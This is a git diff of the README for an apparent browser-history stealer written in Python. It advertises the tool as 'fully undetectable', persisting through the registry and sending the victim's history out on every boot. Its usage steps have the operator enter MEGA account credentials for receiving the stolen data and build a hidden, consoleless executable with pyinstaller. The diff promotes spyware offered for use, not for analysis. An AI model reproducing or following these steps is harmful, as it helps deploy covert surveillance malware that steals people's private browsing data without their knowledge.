@@ -20,10 +20,11 @@
 
 
 # Features:
-  Very Simple And Fully Undectable
-  run in registry 
-  send history every time run pc
-
+````
+  1- Very Simple And Fully Undectable
+  2- run in registry 
+  3- send history every time run pc
+````
 
 # Installation:
     ````
@@ -34,11 +35,9 @@
 
 # Usage:
    ````
-   1. python3 History.py
+   1. python3 Run_HS.py
    2. set your mega acc and pass 
-   3. Convet the .py to exe You can use :  "pyinstaller"
-   To install pyinstaller: "https://www.pyinstaller.org"
-   To Convet .py File to exe : pyinstaller --onefile --noconsole  History.py 
+   3. Convet the .py to exe (yes or no)
    ````
      
  ## [+] Find Me on :
